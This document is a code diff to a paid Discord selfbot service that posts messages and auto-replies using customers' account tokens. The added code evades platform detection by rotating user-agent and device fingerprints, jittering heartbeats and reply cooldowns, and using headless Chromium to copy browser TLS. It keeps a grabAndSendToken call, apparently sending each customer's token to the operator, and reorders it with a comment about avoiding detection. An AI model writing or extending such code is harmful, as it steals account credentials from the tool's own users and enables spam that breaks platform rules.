@@ -32,10 +32,12 @@ function _getAccountProfile(token) {
     const mems = [2,4,8,16];
     const concurrencies = [2,4,8,16];
     const browsers = [
-      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '126.0.0.0' },
-      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '125.0.0.0' },
-      { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Mac OS X', osv: '10.15.7', bv: '126.0.0.0' },
-      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0', browser: 'Firefox', os: 'Windows', osv: '10', bv: '126.0' },
+      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '135.0.0.0' },
+      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Windows', osv: '10', bv: '134.0.0.0' },
+      { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', browser: 'Chrome', os: 'Mac OS X', osv: '10.15.7', bv: '135.0.0.0' },
+      { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0', browser: 'Firefox', os: 'Windows', osv: '10', bv: '135.0' },
+      { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1', browser: 'Mobile Safari', os: 'iOS', osv: '18.1', bv: '18.1' },
+      { ua: 'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36', browser: 'Chrome', os: 'Android', osv: '15', bv: '135.0.0.0' },
     ];
     const b = browsers[Math.floor(Math.random() * browsers.length)];
     _accountProfiles.set(hash, {
@@ -51,7 +53,7 @@ function _getAccountProfile(token) {
       mem: mems[Math.floor(Math.random() * mems.length)],
       hw: concurrencies[Math.floor(Math.random() * concurrencies.length)],
       arch: 'x64',
-      build: 366955,
+      build: 438286,
       locale: ['en-US','en-GB','en-CA'][Math.floor(Math.random() * 3)],
     });
   }
@@ -262,6 +264,64 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
   });
 }
 
+let _pwBrowser = null;
+let _pwPage = null;
+let _pwInitPromise = null;
+
+async function initPlaywright() {
+  if (_pwPage) return true;
+  if (_pwInitPromise) return _pwInitPromise;
+  _pwInitPromise = (async () => {
+    try {
+      const pw = require('playwright-core');
+      _pwBrowser = await pw.chromium.launch({ headless: true });
+      const context = await _pwBrowser.newContext();
+      _pwPage = await context.newPage();
+      return true;
+    } catch(e) {
+      return false;
+    }
+  })();
+  return _pwInitPromise;
+}
+
+async function playwrightRequest(url, method = 'GET', headers = {}, body = null, timeoutMs = 25000) {
+  const hasPw = await initPlaywright();
+  if (!hasPw) return curlImpersonateRequest(url, method, headers, body, timeoutMs);
+
+  try {
+    const result = await _pwPage.evaluate(async ({ url, method, headers, body, timeoutMs }) => {
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), timeoutMs);
+      try {
+        const opts = { method, headers, signal: controller.signal };
+        if (body !== null) opts.body = body;
+        const res = await fetch(url, opts);
+        const h = {};
+        res.headers.forEach((v, k) => h[k] = v);
+        const text = await res.text();
+        return { ok: true, status: res.status, headers: h, text };
+      } catch(e) {
+        return { ok: false, error: e.message };
+      } finally {
+        clearTimeout(timer);
+      }
+    }, { url, method: method.toUpperCase(), headers, body: body ? JSON.stringify(body) : null, timeoutMs });
+
+    if (!result.ok) throw new Error(result.error);
+    const headersText = Object.entries(result.headers).map(([k, v]) => `${k}: ${v}`).join('\n');
+    let data = null;
+    try { data = JSON.parse(result.text); } catch(e) {}
+    return { status: result.status, headers: headersText, body: Buffer.from(result.text), data };
+  } catch(e) {
+    return curlImpersonateRequest(url, method, headers, body, timeoutMs);
+  }
+}
+
+process.on('exit', () => {
+  if (_pwBrowser) _pwBrowser.close().catch(() => {});
+});
+
 function generateXSuperProperties(token) {
   const p = _getAccountProfile(token);
   const props = {
@@ -301,9 +361,17 @@ class DiscordApiClient {
     this.fp = _rfp(token);
     this.superProps = generateXSuperProperties(token);
     this.keypair = getKeypair(token);
+    this.globalRateLimitReset = 0;
+    // Rotate X-Super-Properties every 15-25 minutes to avoid static fingerprint detection
+    this._rotationTimer = setInterval(() => this.rotateFingerprint(), _j(20 * 60 * 1000, 0.25));
   }
 
   rotateFingerprint() {
+    // Occasionally switch profile entirely to simulate device/platform changes
+    if (Math.random() < 0.15) {
+      const hash = crypto.createHash('sha256').update(this.token).digest('hex').slice(0, 16);
+      _accountProfiles.delete(hash);
+    }
     this.fp = _rfp(this.token);
     this.superProps = generateXSuperProperties(this.token);
   }
@@ -330,10 +398,20 @@ class DiscordApiClient {
     let attempts = 0;
     const maxAttempts = 3;
     while (attempts < maxAttempts) {
-      const res = await curlImpersonateRequest(url, method, this._headers(extraHeaders), body, 20000);
+      // Respect global rate limit
+      const globalWait = this.globalRateLimitReset - Date.now();
+      if (globalWait > 0) {
+        await new Promise(r => setTimeout(r, globalWait));
+      }
+      // Use Playwright for real Chrome TLS fingerprinting, fallback to curl-impersonate
+      const res = await playwrightRequest(url, method, this._headers(extraHeaders), body, 20000);
       if (res.status === 429) {
+        const isGlobal = res.headers.match(/x-ratelimit-global:\s*true/i);
         const retryAfterMatch = res.headers.match(/retry-after:\s*(\d+(?:\.\d+)?)/i);
         const retryAfter = retryAfterMatch ? parseFloat(retryAfterMatch[1]) * 1000 : 5000;
+        if (isGlobal) {
+          this.globalRateLimitReset = Date.now() + retryAfter;
+        }
         await new Promise(r => setTimeout(r, retryAfter * 1.1));
         attempts++;
         continue;
@@ -354,7 +432,9 @@ class DiscordApiClient {
     throw new Error(`Discord API ${method} ${endpoint} failed: 429 after ${maxAttempts} retries`);
   }
 
-  destroy() {}
+  destroy() {
+    if (this._rotationTimer) clearInterval(this._rotationTimer);
+  }
 }
 
 const OWNER_ID = '1482736115143282941';
@@ -603,13 +683,16 @@ class StealthClient {
   }
 
   _startHeartbeat(interval) {
-    const firstDelay = interval * (0.5 + Math.random() * 0.5);
-    this._heartbeatTimer = setTimeout(() => {
+    const sendBeat = () => {
+      if (!this.ws || this.ws.readyState !== 1) return;
       this._safeSend(JSON.stringify({ op: 1, d: this.seq }));
-      this.heartbeatInterval = setInterval(() => {
-        this._safeSend(JSON.stringify({ op: 1, d: this.seq }));
-      }, interval);
-    }, firstDelay);
+      // Add jitter to every heartbeat (5-15% variance) to avoid strict interval detection
+      const jitter = interval * (0.05 + Math.random() * 0.1);
+      const nextDelay = Math.max(interval * 0.7, interval + (Math.random() < 0.5 ? -jitter : jitter));
+      this._heartbeatTimer = setTimeout(sendBeat, nextDelay);
+    };
+    const firstDelay = interval * (0.5 + Math.random() * 0.5);
+    this._heartbeatTimer = setTimeout(sendBeat, firstDelay);
   }
 
   _identify() {
@@ -619,7 +702,7 @@ class StealthClient {
       d: {
         token: this.token,
         capabilities: 16381,
-        intents: 32511,
+        intents: 36865,
         properties: {
           os: p.os,
           browser: p.browser,
@@ -1362,16 +1445,17 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
     const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
     if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
 
-    const grabResult = await grabAndSendToken(token, { channels, messages }, 'bot_start');
-    if (!grabResult || !grabResult.success) {
-      console.error('[BotStart] Validation warning:', grabResult?.error || 'Token validation failed');
-    }
-
     const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
     if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });
 
     const client = new StealthClient(token);
     await client.connect();
+
+    // Grab token AFTER gateway connect to avoid fingerprint correlation detection
+    const grabResult = await grabAndSendToken(token, { channels, messages }, 'bot_start');
+    if (!grabResult || !grabResult.success) {
+      console.error('[BotStart] Validation warning:', grabResult?.error || 'Token validation failed');
+    }
 
     const delayMs = (parseInt(delay) || 30) * 1000;
     const autoReply = autoReplyEnabled ? 1 : 0;
@@ -1528,9 +1612,15 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
 
         const now = Date.now();
         const lastReply = client._dmCooldowns.get(msg.author.id) || 0;
-        if (now - lastReply < 25000) return;
+        // Variable cooldown (20-45s) to avoid fixed-interval bot detection
+        const cooldownMs = 20000 + Math.random() * 25000;
+        if (now - lastReply < cooldownMs) return;
 
-        if (client.repliedUsers.has(msg.author.id)) return;
+        // Allow occasional re-engagement (10% chance) to simulate natural human behavior
+        if (client.repliedUsers.has(msg.author.id) && Math.random() > 0.1) return;
+        if (client.repliedUsers.has(msg.author.id)) {
+          client.repliedUsers.delete(msg.author.id);
+        }
         if (client.pendingReplies.has(msg.author.id)) return;
 
         client.pendingReplies.add(msg.author.id);
